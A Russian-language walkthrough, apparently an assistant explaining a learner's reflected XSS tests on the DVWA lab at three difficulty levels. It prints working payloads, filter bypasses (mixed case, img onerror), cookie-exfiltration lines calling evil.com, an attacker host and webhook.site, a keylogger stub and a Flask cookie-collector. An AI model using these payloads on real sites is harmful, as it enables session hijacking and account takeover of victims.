## üî• **XSS (Cross-Site Scripting)**: –ß—Ç–æ —Ç—ã —Å–µ–π—á–∞—Å –ø—Ä–æ–≤–µ—Ä–∏–ª?

–¢—ã –ø—Ä–æ—Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–ª **Reflected XSS** –Ω–∞ —Ç—Ä—ë—Ö —É—Ä–æ–≤–Ω—è—Ö —Å–ª–æ–∂–Ω–æ—Å—Ç–∏: `low`, `medium`, `high`.

---

## üîπ –£—Ä–æ–≤–µ–Ω—å Low

### üìç URL:

```
http://localhost:8081/vulnerabilities/xss_r/?name=<script>alert(1)</script>
```

### üîç –ß—Ç–æ –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç?

1. –¢—ã –ø–µ—Ä–µ–¥–∞–ª –≤ `GET` –ø–∞—Ä–∞–º–µ—Ç—Ä–µ `name` JavaScript-–∫–æ–¥: `<script>alert(1)</script>`
2. –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –ø—Ä–æ—Å—Ç–æ –≤—Å—Ç–∞–≤–∏–ª–æ —ç—Ç–æ –≤ HTML-–æ—Ç–≤–µ—Ç, **–±–µ–∑ —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏**:

   ```html
   Hello <script>alert(1)</script>
   ```
3. –ë—Ä–∞—É–∑–µ—Ä –∏—Å–ø–æ–ª–Ω–∏–ª JS ‚Äî —Ç—ã —É–≤–∏–¥–µ–ª `alert(1)`

### üõ†Ô∏è –£—è–∑–≤–∏–º–æ—Å—Ç—å:

**Reflected XSS (OWASP A03:2021 ‚Äî Injection)**

* –ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ **–Ω–µ —Ñ–∏–ª—å—Ç—Ä—É–µ—Ç –≤—Ö–æ–¥—è—â–∏–µ –¥–∞–Ω–Ω—ã–µ** –ø–µ—Ä–µ–¥ –≤—ã–≤–æ–¥–æ–º –Ω–∞ —Å—Ç—Ä–∞–Ω–∏—Ü—É.
* –í—Ä–µ–¥–æ–Ω–æ—Å–Ω—ã–π –∫–æ–¥ –º–æ–∂–µ—Ç –±—ã—Ç—å –≤–Ω–µ–¥—Ä—ë–Ω —á–µ—Ä–µ–∑ URL, –∏ **–∏—Å–ø–æ–ª–Ω–µ–Ω –≤ –±—Ä–∞—É–∑–µ—Ä–µ –∂–µ—Ä—Ç–≤—ã**.

---

## üîπ –£—Ä–æ–≤–µ–Ω—å Medium

### üìç –ö–æ–¥, –∫–æ—Ç–æ—Ä—ã–π —Ç—ã –≤–≤—ë–ª:

```html
<ScRiPt>alert(document.cookie)</ScRiPt>
```

–û–Ω —Ç–æ–∂–µ —Å—Ä–∞–±–æ—Ç–∞–ª. –ü–æ—á–µ–º—É?

* –•–æ—Ç—è —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏—è –µ—Å—Ç—å, –æ–Ω–∞ **–Ω–µ —Ä–∞–∑–ª–∏—á–∞–µ—Ç —Ä–µ–≥–∏—Å—Ç—Ä —Å–∏–º–≤–æ–ª–æ–≤** (`ScRiPt` ‚âà `script`).
* –≠—Ç–æ —Ç–∏–ø–∏—á–Ω–∞—è –æ—à–∏–±–∫–∞ –ø—Ä–∏ **–Ω–∞–∏–≤–Ω–æ–π —Ñ–∏–ª—å—Ç—Ä–∞—Ü–∏–∏**.

### üîê –ß—Ç–æ —Ç—ã —É–≤–∏–¥–µ–ª?

```text
PHPSESSID=...; language=en; ...
```

‚Äî –≠—Ç–æ **HTTP cookie**, –≤–∫–ª—é—á–∞—é—â–µ–µ **–∏–¥–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ç–æ—Ä —Å–µ—Å—Å–∏–∏** (`PHPSESSID`).

---

## üî• –ö–∞–∫ –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫ –º–æ–∂–µ—Ç –∏—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å —ç—Ç–æ?

### 1. üì¨ **–ü–æ—Ö–∏—â–µ–Ω–∏–µ –∫—É–∫–∏ (session hijacking)**:

–í–º–µ—Å—Ç–æ `alert(document.cookie)` –≤—Å—Ç–∞–≤–ª—è–µ—Ç—Å—è **–æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ –≤–Ω–µ—à–Ω–∏–π —Å–µ—Ä–≤–µ—Ä**:

```html
<script>
fetch("https://evil.com/steal?c=" + document.cookie)
</script>
```

–ò–ª–∏ –¥–∞–∂–µ –∫–æ—Ä–æ—á–µ:

```html
<img src="https://evil.com/steal?c=" + document.cookie>
```

–ñ–µ—Ä—Ç–≤–∞ –æ—Ç–∫—Ä—ã–≤–∞–µ—Ç —Å—Å—ã–ª–∫—É ‚Äî –µ—ë –∫—É–∫–∞ **—É—Ö–æ–¥–∏—Ç –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É**, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–µ—Ç:

* –ò—Å–ø–æ–ª—å–∑–æ–≤–∞—Ç—å –∫—É–∫—É `PHPSESSID` –∏ **–∑–∞–ª–æ–≥–∏–Ω–∏—Ç—å—Å—è –∫–∞–∫ –∂–µ—Ä—Ç–≤–∞**.
* –ü–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —Å–µ—Å—Å–∏–∏, –¥–∞–∂–µ **–±–µ–∑ –ª–æ–≥–∏–Ω–∞ –∏ –ø–∞—Ä–æ–ª—è**.

---

## üîπ –£—Ä–æ–≤–µ–Ω—å High

### üìÑ –¢—ã –ø–æ—Å–º–æ—Ç—Ä–µ–ª –∏—Å—Ö–æ–¥–Ω–∏–∫:

```php
$name = preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET[ 'name' ] );
```

–≠—Ç–æ **—Ä–µ–≥—É–ª—è—Ä–∫–∞**, –∫–æ—Ç–æ—Ä–∞—è —É–¥–∞–ª—è–µ—Ç –ª—é–±—ã–µ –≤—Ö–æ–∂–¥–µ–Ω–∏—è `script`, –¥–∞–∂–µ –µ—Å–ª–∏ –æ–Ω–∏ —Ä–∞–∑–æ—Ä–≤–∞–Ω—ã.

### ü§Ø –ù–æ —Ç—ã –æ–±–æ—à—ë–ª —Ñ–∏–ª—å—Ç—Ä —Ç–∞–∫:

```html
<img src=123.png onerror="alert(document.cookie)">
```

–ü–æ—á–µ–º—É —Å—Ä–∞–±–æ—Ç–∞–ª–æ?

* **`<img>`** ‚Äî —ç—Ç–æ **–Ω–µ `script`**, –µ–≥–æ —Ñ–∏–ª—å—Ç—Ä **–Ω–µ –±–ª–æ–∫–∏—Ä—É–µ—Ç**.
* **–ê—Ç—Ä–∏–±—É—Ç `onerror`** ‚Äî –≤—ã–∑—ã–≤–∞–µ—Ç—Å—è, –µ—Å–ª–∏ –∫–∞—Ä—Ç–∏–Ω–∫–∞ **–Ω–µ –∑–∞–≥—Ä—É–∑–∏–ª–∞—Å—å** (–≤ —Ç–≤–æ—ë–º —Å–ª—É—á–∞–µ, `123.png` –Ω–µ —Å—É—â–µ—Å—Ç–≤—É–µ—Ç).
* JS-–∫–æ–¥ –≤ `onerror="..."` —É—Å–ø–µ—à–Ω–æ –∏—Å–ø–æ–ª–Ω—è–µ—Ç—Å—è.

---

## üß† –ß—Ç–æ —Ç—ã —Ç–æ–ª—å–∫–æ —á—Ç–æ –ø—Ä–æ–¥–µ–º–æ–Ω—Å—Ç—Ä–∏—Ä–æ–≤–∞–ª?

### ‚úÖ –ö–ª–∏–µ–Ω—Ç—Å–∫–∞—è —É—è–∑–≤–∏–º–æ—Å—Ç—å: **Reflected XSS**

* –í—Å—Ç–∞–≤–∫–∞ –≤—Ä–µ–¥–æ–Ω–æ—Å–Ω–æ–≥–æ –∫–æ–¥–∞ —á–µ—Ä–µ–∑ URL ‚Üí JS –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è —É –∂–µ—Ä—Ç–≤—ã.

### ‚úÖ –û–±—Ö–æ–¥ —Ñ–∏–ª—å—Ç—Ä–æ–≤ —á–µ—Ä–µ–∑:

* –†–∞–∑–Ω—ã–µ —Ä–µ–≥–∏—Å—Ç—Ä—ã (`ScRiPt`)
* –ê–ª—å—Ç–µ—Ä–Ω–∞—Ç–∏–≤–Ω—ã–µ —Ç–µ–≥–∏ (`<img>`, `<svg>`, `<iframe>`)
* –°–æ–±—ã—Ç–∏—è (`onerror`, `onload`, `onclick`, `onmouseover`)

---

## üéØ –†–µ–∞–ª—å–Ω–æ–µ –ø—Ä–∏–º–µ–Ω–µ–Ω–∏–µ XSS

| –ê—Ç–∞–∫–∞             | –ö–∞–∫ –≤—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è                                                 | –¶–µ–ª—å                       |
| ----------------- | --------------------------------------------------------------- | -------------------------- |
| –ü–æ—Ö–∏—â–µ–Ω–∏–µ cookies | `<img src="http://attacker/cookie?c="+document.cookie>`         | –ü–µ—Ä–µ—Ö–≤–∞—Ç —Å–µ—Å—Å–∏–∏            |
| Keylogger         | `<script>document.onkeypress=function(e){fetch(...);}</script>` | –ó–∞—Ö–≤–∞—Ç –≤–≤–æ–¥–∞               |
| Deface            | `<script>document.body.innerHTML="Hacked!"</script>`            | –ù–∞—Ä—É—à–µ–Ω–∏–µ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞       |
| CSRF —á–µ—Ä–µ–∑ XSS    | `<script>fetch('/transfer?amount=10000')</script>`              | –ê—Ç–∞–∫–∞ –æ—Ç –ª–∏—Ü–∞ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è |

---

## üì§ –û—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –∑–ª–æ—É–º—ã—à–ª–µ–Ω–Ω–∏–∫—É

1. **–°–æ–∑–¥–∞–π —Å–µ—Ä–≤–µ—Ä** (–Ω–∞–ø—Ä–∏–º–µ—Ä, –Ω–∞ ngrok, Flask, Express.js) –¥–ª—è —Å–±–æ—Ä–∞ –¥–∞–Ω–Ω—ã—Ö:

   ```python
   from flask import request
   app.route('/steal')
   def get_data():
       print(request.args.get('c'))  # –∫—É–∫–∏ –∂–µ—Ä—Ç–≤—ã
   ```

2. –ò–ª–∏ –∏—Å–ø–æ–ª—å–∑—É–π –≥–æ—Ç–æ–≤—ã–µ —Å–µ—Ä–≤–∏—Å—ã:

   * [https://webhook.site](https://webhook.site) ‚Äî –¥–∞—ë—Ç URL –∏ –ø–æ–∫–∞–∑—ã–≤–∞–µ—Ç –≤—Å—ë, —á—Ç–æ —Ç—É–¥–∞ –ø—Ä–∏—à–ª–æ.

3. –ò–Ω–∂–µ–∫—Ç–∏—à—å –≤ XSS:

   ```html
   <script>
     fetch("https://webhook.site/your-id?cookie=" + document.cookie)
   </script>
   ```

---

## üìÅ –ö–∞–∫ —Å–º–æ—Ç—Ä–µ—Ç—å –∏—Å—Ö–æ–¥–Ω–∏–∫–∏ –Ω–∞ "—Ä–µ–∞–ª—å–Ω–æ–º" —Å–∞–π—Ç–µ

–ï—Å–ª–∏ –Ω–∞ —Å–∞–π—Ç–µ –Ω–µ—Ç –æ—Ç–∫—Ä—ã—Ç–æ–π –∫–Ω–æ–ø–∫–∏ "View Source":

1. –ò—Å–ø–æ–ª—å–∑—É–π **Burp Suite** ‚Äî –ø–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–π –∑–∞–ø—Ä–æ—Å, –º–µ–Ω—è–π –ø–∞—Ä–∞–º–µ—Ç—Ä—ã, —Å–º–æ—Ç—Ä–∏ –æ—Ç–≤–µ—Ç—ã.
2. –ò–ª–∏ –≤–∫–ª—é—á–∞–π DevTools ‚Üí `Sources` –∏ `Network` ‚Äî —Å–º–æ—Ç—Ä–∏ —Å–∫—Ä–∏–ø—Ç—ã –∏ –æ—Ç–≤–µ—Ç—ã —Å–µ—Ä–≤–µ—Ä–∞.
3. –ó–∞–ø—Ä–æ—Å–∏ `/vulnerabilities/xss_r/source/high.php` ‚Äî –µ—Å–ª–∏ —Å–∞–π—Ç –ø–æ–∑–≤–æ–ª—è–µ—Ç —Å–º–æ—Ç—Ä–µ—Ç—å `source`, –ø–æ–ª—É—á–∏—à—å –∫–æ–¥.

–ù–∞ **—Å–≤–æ—ë–º —Å–∞–π—Ç–µ** ‚Äî –ª–æ–≥–∏—á–Ω–æ, —Ç—ã –ø—Ä–æ—Å—Ç–æ –∑–∞—Ö–æ–¥–∏—à—å –≤ `source` —á–µ—Ä–µ–∑ IDE –∏–ª–∏ FTP/SSH.

---

## üß† –†–µ–∑—é–º–µ

| –¢–≤–æ—è –∞—Ç–∞–∫–∞               | –ö–∞–∫ —Å—Ä–∞–±–æ—Ç–∞–ª–∞    | –ß—Ç–æ –ø–æ–∫–∞–∑–∞–ª–∞        |
| ------------------------ | ---------------- | ------------------- |
| `script>alert(1)`        | –ù–µ —Ñ–∏–ª—å—Ç—Ä–æ–≤–∞–ª–æ—Å—å | XSS —É—Ä–æ–≤–Ω—è Low      |
| `alert(document.cookie)` | –í—ã–≤–æ–¥ –∫—É–∫–∏       | session hijack      |
| `<img onerror=...>`      | –û–±—Ö–æ–¥ —Ñ–∏–ª—å—Ç—Ä–∞    | XSS –≤—ã—Å–æ–∫–æ–≥–æ —É—Ä–æ–≤–Ω—è |
